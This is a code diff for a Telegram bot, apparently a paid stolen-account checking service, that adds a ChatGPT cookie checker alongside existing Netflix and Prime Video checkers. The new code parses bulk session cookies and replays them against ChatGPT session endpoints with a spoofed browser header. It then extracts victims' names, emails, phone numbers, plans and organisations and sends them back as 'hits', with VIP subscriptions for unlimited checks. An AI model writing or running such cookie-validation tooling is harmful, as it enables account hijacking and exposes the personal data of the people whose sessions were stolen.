@@ -83,7 +83,7 @@ export function setupBot() {
   function mainMenu(): TelegramBot.InlineKeyboardButton[][] {
     return [
       [{ text: "🔴 Netflix Checker", callback_data: "nf_checker" }, { text: "📺 Prime Video Checker", callback_data: "prime_checker" }],
-      [{ text: "🔑 NF Token Generator", callback_data: "nf_token" }],
+      [{ text: "🔑 NF Token Generator", callback_data: "nf_token" }, { text: "🤖 ChatGPT Checker", callback_data: "gpt_checker" }],
       [{ text: "👤 My Profile", callback_data: "profile" }, { text: "👑 VIP Subscribe", callback_data: "vip_info" }],
       [{ text: "🔗 Referral Link", callback_data: "referral" }],
     ];
@@ -498,6 +498,182 @@ export function setupBot() {
     } catch (err: any) {
       return { success: false, isPrime: false, error: err.message || "Unknown error" };
     }
+  }
+
+  const PLAN_MAP: Record<string, string> = {
+    free: "Free", plus: "Plus", pro: "Pro", pro_lite: "Pro Lite",
+    go: "Go", team: "Team", enterprise: "Enterprise", business: "Business",
+  };
+  const PAID_PLANS = new Set(["plus", "pro", "pro_lite", "go", "team", "enterprise", "business"]);
+
+  interface GPTCheckResult {
+    loggedIn: boolean;
+    userId?: string;
+    name?: string;
+    email?: string;
+    phone?: string;
+    picture?: string;
+    planRaw?: string;
+    planLabel: string;
+    isPaid: boolean;
+    orgs: string[];
+    error?: string;
+  }
+
+  function parseGPTCookies(text: string): Record<string, string> {
+    const trimmed = text.trim();
+    if (trimmed.startsWith("[")) {
+      try {
+        const arr = JSON.parse(trimmed);
+        if (Array.isArray(arr)) {
+          const ck: Record<string, string> = {};
+          for (const c of arr) {
+            if (typeof c !== "object" || !c.name) continue;
+            const domain = c.domain || "";
+            if (domain.includes("chatgpt.com") || domain.includes("openai.com")) {
+              ck[c.name] = String(c.value || "");
+            }
+          }
+          if (Object.keys(ck).length > 0) return ck;
+          const ckAll: Record<string, string> = {};
+          for (const c of arr) {
+            if (typeof c === "object" && c.name) ckAll[c.name] = String(c.value || "");
+          }
+          return ckAll;
+        }
+      } catch {}
+    }
+
+    const ckGpt: Record<string, string> = {};
+    const ckAll: Record<string, string> = {};
+    let isNetscape = false;
+    for (const line of trimmed.split("\n")) {
+      let l = line.trim();
+      if (!l) continue;
+      if (l.startsWith("#HttpOnly_") || l.startsWith("#HttpOnly ")) l = l.substring(1);
+      else if (l.startsWith("#")) continue;
+      const parts = l.split("\t");
+      if (parts.length >= 7) {
+        isNetscape = true;
+        const domain = parts[0];
+        const name = parts[5];
+        const value = parts[6];
+        if (!name) continue;
+        ckAll[name] = value;
+        if (domain.includes("chatgpt.com") || domain.includes("openai.com")) {
+          ckGpt[name] = value;
+        }
+      }
+    }
+    if (isNetscape) return Object.keys(ckGpt).length > 0 ? ckGpt : ckAll;
+
+    if (trimmed.includes("=")) {
+      const hck: Record<string, string> = {};
+      for (const part of trimmed.replace(/\n/g, ";").split(";")) {
+        const eqIdx = part.indexOf("=");
+        if (eqIdx > 0) {
+          const k = part.substring(0, eqIdx).trim();
+          const v = part.substring(eqIdx + 1).trim();
+          if (k) hck[k] = v;
+        }
+      }
+      return hck;
+    }
+    return {};
+  }
+
+  async function checkGPTCookie(cookies: Record<string, string>): Promise<GPTCheckResult> {
+    const info: GPTCheckResult = {
+      loggedIn: false, planLabel: "Free", isPaid: false, orgs: [],
+    };
+
+    try {
+      const cookieStr = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join("; ");
+
+      const HDR: Record<string, string> = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Accept": "application/json",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "https://chatgpt.com/",
+        "Origin": "https://chatgpt.com",
+        "Cookie": cookieStr,
+      };
+
+      const r1 = await fetch("https://chatgpt.com/api/auth/session", {
+        headers: HDR, redirect: "manual", signal: AbortSignal.timeout(20000),
+      });
+
+      if ([301, 302, 303, 307, 308, 401, 403].includes(r1.status)) {
+        return { ...info, error: `HTTP ${r1.status}` };
+      }
+
+      if (r1.status === 200) {
+        const d1: any = await r1.json();
+        if (!d1 || d1.error) return { ...info, error: "Empty or error response" };
+
+        info.loggedIn = true;
+        const u = d1.user || {};
+        info.email = u.email || "";
+        info.name = u.name || "";
+        info.picture = u.image || u.picture || "";
+        info.userId = u.id || "";
+
+        const account = d1.account || {};
+        const planRaw = (account.planType || "free").toLowerCase();
+        info.planRaw = planRaw;
+        info.planLabel = PLAN_MAP[planRaw] || planRaw.charAt(0).toUpperCase() + planRaw.slice(1);
+        info.isPaid = PAID_PLANS.has(planRaw);
+
+        const accessToken = d1.accessToken;
+        if (accessToken) {
+          try {
+            const r2 = await fetch("https://chatgpt.com/backend-api/me", {
+              headers: { ...HDR, "Authorization": `Bearer ${accessToken}` },
+              redirect: "manual", signal: AbortSignal.timeout(15000),
+            });
+            if (r2.status === 200) {
+              const d2: any = await r2.json();
+              info.email = info.email || d2.email || "";
+              info.name = info.name || d2.name || "";
+              info.phone = d2.phone_number || "";
+              info.userId = info.userId || d2.id || "";
+              const orgsData = d2.orgs?.data || [];
+              info.orgs = orgsData.map((o: any) => o.title).filter(Boolean);
+            }
+          } catch {}
+        }
+      }
+    } catch (err: any) {
+      info.error = err.message || "Unknown error";
+    }
+
+    return info;
+  }
+
+  function formatGPTHit(h: GPTCheckResult, idx: number): string {
+    const icon = h.isPaid ? "💎" : "✅";
+    let msg = `${icon} <b>Hit #${idx} — ChatGPT ${esc(h.planLabel.toUpperCase())}</b>\n${"─".repeat(25)}\n`;
+    if (h.name) msg += `👤 <b>Name:</b> ${esc(h.name)}\n`;
+    if (h.email) msg += `📧 <b>Email:</b> <code>${esc(h.email)}</code>\n`;
+    if (h.phone) msg += `📱 <b>Phone:</b> ${esc(h.phone)}\n`;
+    msg += `💎 <b>Plan:</b> ${esc(h.planLabel)}\n`;
+    msg += `💰 <b>Paid:</b> ${h.isPaid ? "YES" : "NO"}\n`;
+    if (h.orgs.length > 0) msg += `🏢 <b>Orgs:</b> ${h.orgs.map(esc).join(", ")}\n`;
+    if (h.userId) msg += `🔑 <b>User ID:</b> <code>${esc(h.userId)}</code>\n`;
+    msg += `\n<i>Checked by @XK6271</i>`;
+    return msg;
+  }
+
+  function formatGPTHitPlain(h: GPTCheckResult, idx: number): string {
+    let line = `═══ Hit #${idx} — ChatGPT ${h.planLabel.toUpperCase()} ═══\n`;
+    if (h.name) line += `Name: ${h.name}\n`;
+    if (h.email) line += `Email: ${h.email}\n`;
+    if (h.phone) line += `Phone: ${h.phone}\n`;
+    line += `Plan: ${h.planLabel}\n`;
+    line += `Paid: ${h.isPaid ? "YES" : "NO"}\n`;
+    if (h.orgs.length > 0) line += `Orgs: ${h.orgs.join(", ")}\n`;
+    if (h.userId) line += `User ID: ${h.userId}\n`;
+    return line;
   }
 
   function formatNFHit(h: NFCheckResult, idx: number): string {
@@ -918,6 +1094,24 @@ export function setupBot() {
       pending[userId] = { action: "nf_token_only" };
       return bot.sendMessage(chatId,
         `🔑 <b>NF Token Generator</b>\n${"─".repeat(30)}\n\n📊 ${remaining}\n\n📋 Send Netflix cookies (NetflixId values)\n\n🔑 This mode extracts <b>only the login token</b> — fast and simple!\n\n📝 <b>Format:</b>\n• One cookie per line\n• 📄 File (.txt, .csv, .json)\n• 📦 .zip archive\n\n💡 Send cookies now or /cancel`,
+        { parse_mode: "HTML" }
+      );
+    }
+
+    if (data === "gpt_checker") {
+      const vip = storage.isVip(String(userId)) || isOwner(userId);
+      const used = storage.getDailyChecks(String(userId));
+      if (!vip && used >= DAILY_LIMIT) {
+        return bot.sendMessage(chatId,
+          `⚠️ Daily limit reached (<b>${DAILY_LIMIT}</b>).\n\n👑 Get VIP for unlimited!\nContact: @XK6271`,
+          { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "👑 VIP Info", callback_data: "vip_info" }, { text: "🔙 Menu", callback_data: "main_menu" }]] } }
+        );
+      }
+
+      const remaining = vip ? "♾️ Unlimited" : `${DAILY_LIMIT - used} remaining`;
+      pending[userId] = { action: "gpt_check" };
+      return bot.sendMessage(chatId,
+        `🤖 <b>ChatGPT Cookie Checker</b>\n${"─".repeat(30)}\n\n📊 ${remaining}\n\n📋 Send ChatGPT cookies\n\n📝 <b>Supported formats:</b>\n• JSON array (cookie editor export)\n• Netscape format (.txt)\n• Header string (key=value;key=value)\n• 📄 File (.txt, .json)\n• 📦 .zip archive\n\n⏳ Checks for:\n✅ Active login\n💎 Plan (Free/Plus/Pro/Team)\n👤 Account details\n🏢 Organizations\n\n💡 Send cookies now or /cancel`,
         { parse_mode: "HTML" }
       );
     }
@@ -1394,6 +1588,120 @@ export function setupBot() {
         fileContent += `${"═".repeat(40)}\nTotal Hits: ${primeHits.length}\nChecked by @XK6271`;
         const buf = Buffer.from(fileContent, "utf8");
         await bot.sendDocument(chatId, buf, { caption: `📄 ${primeHits.length} Prime Hits | by @XK6271` }, { filename: `prime_hits_${Date.now()}.txt`, contentType: "text/plain" });
+      }
+
+      delete pending[userId];
+      return;
+    }
+
+    if (userPending.action === "gpt_check") {
+      let cookieText = "";
+      if (msg.document) {
+        const extracted = await extractFileText(msg);
+        if (!extracted) return;
+        cookieText = extracted;
+      } else {
+        cookieText = text;
+      }
+
+      const cookieEntries = cookieText.trim().split(/\n\s*\n/).filter(Boolean);
+      const parsedCookies: Record<string, string>[] = [];
+
+      if (cookieEntries.length <= 1) {
+        const parsed = parseGPTCookies(cookieText);
+        if (Object.keys(parsed).length > 0) parsedCookies.push(parsed);
+      } else {
+        for (const entry of cookieEntries) {
+          const parsed = parseGPTCookies(entry.trim());
+          if (Object.keys(parsed).length > 0) parsedCookies.push(parsed);
+        }
+      }
+
+      if (parsedCookies.length === 0) {
+        const singleParsed = parseGPTCookies(cookieText);
+        if (Object.keys(singleParsed).length > 0) parsedCookies.push(singleParsed);
+      }
+
+      if (parsedCookies.length === 0) {
+        return bot.sendMessage(chatId, "❌ No valid ChatGPT cookies found.", { parse_mode: "HTML" });
+      }
+
+      const vip = storage.isVip(String(userId)) || isOwner(userId);
+      const used = storage.getDailyChecks(String(userId));
+      const canCheck = vip ? parsedCookies.length : Math.min(parsedCookies.length, DAILY_LIMIT - used);
+
+      if (canCheck <= 0) {
+        delete pending[userId];
+        return bot.sendMessage(chatId,
+          `⚠️ Daily limit reached (${DAILY_LIMIT}). Get VIP for unlimited!\nContact: @XK6271`,
+          { parse_mode: "HTML", reply_markup: { inline_keyboard: mainMenu() } }
+        );
+      }
+
+      const toCheck = parsedCookies.slice(0, canCheck);
+      if (toCheck.length < parsedCookies.length) {
+        await bot.sendMessage(chatId, `⚠️ Checking only ${toCheck.length} of ${parsedCookies.length} (daily limit).`);
+      }
+
+      cancelled.delete(userId);
+      const statusMsg = await bot.sendMessage(chatId,
+        `🤖 Checking <b>${toCheck.length}</b> ChatGPT cookie(s)...\n\n⏳ Please wait...\n\nType /cancel to stop`,
+        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel_check" }]] } }
+      );
+
+      let hits = 0;
+      let free = 0;
+      let dead = 0;
+      let stopped = false;
+      const gptHits: GPTCheckResult[] = [];
+
+      for (let i = 0; i < toCheck.length; i++) {
+        if (cancelled.has(userId)) { stopped = true; cancelled.delete(userId); break; }
+        try {
+          if (i > 0 && i % 3 === 0) {
+            try {
+              await bot.editMessageText(
+                `🤖 Checking... ${i}/${toCheck.length}\n\n💎 Paid: ${hits} | ✅ Free: ${free} | ❌ Dead: ${dead}\n\nType /cancel to stop`,
+                { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel_check" }]] } }
+              );
+            } catch {}
+          }
+
+          const result = await checkGPTCookie(toCheck[i]);
+
+          if (result.loggedIn) {
+            if (result.isPaid) {
+              hits++;
+              gptHits.push(result);
+              await bot.sendMessage(chatId, formatGPTHit(result, hits), { parse_mode: "HTML" });
+            } else {
+              free++;
+              gptHits.push(result);
+              await bot.sendMessage(chatId, formatGPTHit(result, hits + free), { parse_mode: "HTML" });
+            }
+          } else {
+            dead++;
+          }
+        } catch {
+          dead++;
+        }
+      }
+
+      storage.addDailyChecks(String(userId), stopped ? hits + free + dead : toCheck.length);
+
+      try {
+        await bot.editMessageText(
+          `${stopped ? "⛔ <b>Cancelled!</b>" : "✅ <b>ChatGPT Check Complete!</b>"}\n${"─".repeat(25)}\n\n📊 Checked: ${hits + free + dead}/${toCheck.length}\n💎 Paid: ${hits}\n✅ Free: ${free}\n❌ Dead: ${dead}`,
+          { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
+        );
+      } catch {}
+
+      if (gptHits.length > 0) {
+        let fileContent = `ChatGPT Hits - ${new Date().toLocaleString()}\nChecked by @XK6271\n${"═".repeat(40)}\n\n`;
+        gptHits.forEach((h, i) => { fileContent += formatGPTHitPlain(h, i + 1) + "\n"; });
+        fileContent += `${"═".repeat(40)}\nTotal: ${gptHits.length} (Paid: ${hits}, Free: ${free})\nChecked by @XK6271`;
+        const buf = Buffer.from(fileContent, "utf8");
+        await bot.sendDocument(chatId, buf, { caption: `🤖 ${gptHits.length} ChatGPT Hits (💎${hits} Paid, ✅${free} Free) | by @XK6271` }, { filename: `chatgpt_hits_${Date.now()}.txt`, contentType: "text/plain" });
       }
 
       delete pending[userId];
